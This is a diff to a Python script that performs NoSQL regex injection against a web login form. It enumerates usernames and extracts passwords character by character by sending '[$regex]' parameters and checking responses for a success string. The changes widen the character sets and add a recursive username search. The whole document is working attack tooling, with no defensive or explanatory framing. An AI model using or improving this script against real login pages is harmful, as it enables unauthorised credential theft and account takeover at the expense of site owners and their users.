@@ -1,17 +1,20 @@
+
 #!/usr/bin/env python3
 
 from requests_html import HTMLSession
 import requests, sys
 import os
+import string
 try:
     from BeautifulSoup import BeautifulSoup
 except ImportError:
     from bs4 import BeautifulSoup
 
+ugly = 0
 username = "admin"
 user_param = "username"
 password_param = "password"
-success_string = "Welcome back"
+success_string = "Logged"
 
 def print_options():
     clear_terminal()
@@ -205,7 +208,8 @@ def authenticate():
         main()
 
 def get_username(username):
-    alphabet = list(map(chr, range(97, 122)))
+    global ugly
+    alphabet = list(string.ascii_letters) + list(string.digits)
     while True: 
         for c in alphabet:
             params = {
@@ -218,23 +222,31 @@ def get_username(username):
             if not response:
                 not_vulnerable()
                 return
+
             if is_successfull(success_string, response):
-                username = username + c
-                log(f"Next character found! User='{username}'")
-                break
+                ugly = ugly + 1
+                log(f"Ugly is now {ugly}")
+                get_username(username + c)
 
             if c == alphabet[-1]:
+                # log(f"Ugly is now {ugly}")
                 if len(username):
-                    log(f"User found: '{username}'")
-                    return
+                    if ugly == len(username) - 1 and ugly != 0:
+                        log(f"Username length: {len(username)}")
+                        log(f"User found: '{username}'")
+                        ugly = 0
+                        return
+                    else:
+                        return
                 else:
                     not_vulnerable()
                     return
 
+
+
 def get_usernames():
     usernames = []
-    alphabet = list(map(chr, range(97, 122)))
-    
+    alphabet = list(string.ascii_letters) + list(string.digits)
     for c in alphabet:
         params = {
             user_param + "[$regex]":"^"+c+".*",
@@ -245,20 +257,19 @@ def get_usernames():
             not_vulnerable()
             return 
         if is_successfull(success_string, response):
-            username_start_characters.append(c)
+            usernames.append(c)
             log(f"Found a username starting with {c}")
-        if c == alphabet[-1] and not len(username_start_characters):
+        if c == alphabet[-1] and not len(usernames):
             not_vulnerable()
             return 
-        
-    log(f"Discovered {len(usernames)} possible usernames... Getting full names")
-    
+
     for username in usernames:
-        get_username(username)
+       get_username(username)
 
 def get_password(username, pw_length):
     password = ""
-    alphabet = list(map(chr, range(33, 176)))
+    alphabet = string.printable
+    print(alphabet)
     regex_chars = ['.', '^', '*', '+', '-', '?', '$', '\\', '|']
     count = pw_length-1
 
@@ -319,4 +330,3 @@ if __name__ == "__main__":
     else:
         url = sys.argv[1]
         main()
-                
